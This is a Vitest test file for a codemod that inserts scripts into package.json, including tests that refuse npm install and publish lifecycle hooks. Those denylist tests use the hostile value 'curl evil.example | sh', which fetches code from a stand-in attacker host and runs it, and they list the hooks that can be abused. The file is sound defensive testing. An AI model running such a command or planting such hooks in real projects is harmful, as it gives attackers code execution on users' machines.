import { describe, expect, it } from "vitest";
import {
  packageJsonScriptRefusal,
  upsertPackageJsonScript,
} from "./pkg-json-script.js";

const PACKAGE_JSON = `{
  "name": "@repo/api",
  "scripts": {
    "build": "tsup"
  },
  "dependencies": {
    "hono": "4.12.31"
  }
}
`;

const NO_SCRIPTS = `{
  "name": "@repo/api",
  "dependencies": {
    "hono": "4.12.31"
  }
}
`;

describe(upsertPackageJsonScript, () => {
  it("adds a new script to an existing scripts map, keeping prior entries", () => {
    const out = upsertPackageJsonScript(PACKAGE_JSON, {
      name: "db:generate",
      value: "drizzle-kit generate",
    });
    const parsed = JSON.parse(out) as { scripts: Record<string, string> };
    expect(parsed.scripts).toStrictEqual({
      build: "tsup",
      "db:generate": "drizzle-kit generate",
    });
  });

  it("creates the scripts map fresh when it doesn't exist yet", () => {
    const out = upsertPackageJsonScript(NO_SCRIPTS, {
      name: "clean",
      value: "rimraf dist",
    });
    const parsed = JSON.parse(out) as {
      scripts: Record<string, string>;
      name: string;
    };
    expect(parsed.scripts).toStrictEqual({ clean: "rimraf dist" });
    // The rest of the document survives the fresh-map insertion.
    expect(parsed.name).toBe("@repo/api");
  });

  it("is idempotent: re-inserting an already-present script returns the source byte-for-byte", () => {
    const once = upsertPackageJsonScript(PACKAGE_JSON, {
      name: "db:generate",
      value: "drizzle-kit generate",
    });
    const twice = upsertPackageJsonScript(once, {
      name: "db:generate",
      value: "drizzle-kit generate",
    });
    expect(twice).toBe(once);
  });

  it("never clobbers: a script already present under a different command is left untouched", () => {
    const out = upsertPackageJsonScript(PACKAGE_JSON, {
      name: "build",
      value: "vite build",
    });
    expect(out).toBe(PACKAGE_JSON);
    expect(out).not.toContain("vite build");
  });

  it("never clobbers a script the user emptied out", () => {
    const emptied = `{
  "scripts": {
    "clean": ""
  }
}
`;
    const out = upsertPackageJsonScript(emptied, {
      name: "clean",
      value: "rimraf dist",
    });
    expect(out).toBe(emptied);
  });

  it("replaces a non-object scripts member with a fresh map", () => {
    const bogus = `{
  "name": "@repo/api",
  "scripts": null
}
`;
    const out = upsertPackageJsonScript(bogus, {
      name: "clean",
      value: "rimraf dist",
    });
    const parsed = JSON.parse(out) as { scripts: Record<string, string> };
    expect(parsed.scripts).toStrictEqual({ clean: "rimraf dist" });
  });

  it("preserves formatting (2-space indent) of the surrounding document", () => {
    const out = upsertPackageJsonScript(PACKAGE_JSON, {
      name: "db:generate",
      value: "drizzle-kit generate",
    });
    expect(out).toContain('  "scripts"');
    expect(out).toContain('    "db:generate"');
  });

  it("honours a tab-indented document", () => {
    const tabbed =
      '{\n\t"name": "@repo/api",\n\t"scripts": {\n\t\t"build": "tsup"\n\t}\n}\n';
    const out = upsertPackageJsonScript(tabbed, {
      name: "clean",
      value: "rimraf dist",
    });
    expect(out).toContain('\t\t"clean"');
  });

  // jsonc-parser is error-tolerant, so `parseTree` recovers from most malformed input;
  // the `!root` guard only fires on a source with no parseable node at all. Matches
  // upsertPackageJsonDependency, which leans on the same guard.
  it("returns a source with no parseable root unchanged", () => {
    expect(
      upsertPackageJsonScript("", { name: "clean", value: "rimraf dist" })
    ).toBe("");
  });
});

// #98 Phase 1. A descriptor comes from a registry the user may not control, and npm/pnpm
// run these keys on their own at install or publish time. Landing one is arbitrary code
// execution on the next `pnpm install`, so the codemod refuses instead of upserting.
describe("upsertPackageJsonScript — install-lifecycle denylist", () => {
  const LIFECYCLE = [
    "preinstall",
    "install",
    "postinstall",
    // npm wraps every script it runs in a pre/post pair, so these two run on the same
    // `npm install` that runs `prepare` itself.
    "preprepare",
    "prepare",
    "postprepare",
    "prepublish",
    "prepublishOnly",
  ];

  it.each(LIFECYCLE)("leaves %s unwritten", (name) => {
    expect(
      upsertPackageJsonScript(PACKAGE_JSON, {
        name,
        value: "curl evil.example | sh",
      })
    ).toBe(PACKAGE_JSON);
  });

  it.each(LIFECYCLE)("reports %s as a named refusal", (name) => {
    const reason = packageJsonScriptRefusal(PACKAGE_JSON, {
      name,
      value: "curl evil.example | sh",
    });
    expect(reason).toContain(name);
    expect(reason).toMatch(/install|publish/);
  });

  it("does not refuse an ordinary script name", () => {
    expect(
      packageJsonScriptRefusal(PACKAGE_JSON, {
        name: "db:generate",
        value: "drizzle-kit generate",
      })
    ).toBeUndefined();
  });

  it("does not refuse a name that merely contains a lifecycle word", () => {
    const out = upsertPackageJsonScript(NO_SCRIPTS, {
      name: "installer:check",
      value: "node ./check.js",
    });
    const parsed = JSON.parse(out) as { scripts: Record<string, string> };
    expect(parsed.scripts).toStrictEqual({
      "installer:check": "node ./check.js",
    });
  });

  it("stays inside the scripts map: no sibling key is created or moved", () => {
    const out = upsertPackageJsonScript(PACKAGE_JSON, {
      name: "db:generate",
      value: "drizzle-kit generate",
    });
    const parsed = JSON.parse(out) as Record<string, unknown>;
    expect(Object.keys(parsed)).toStrictEqual([
      "name",
      "scripts",
      "dependencies",
    ]);
    expect(parsed.dependencies).toStrictEqual({ hono: "4.12.31" });
  });
});
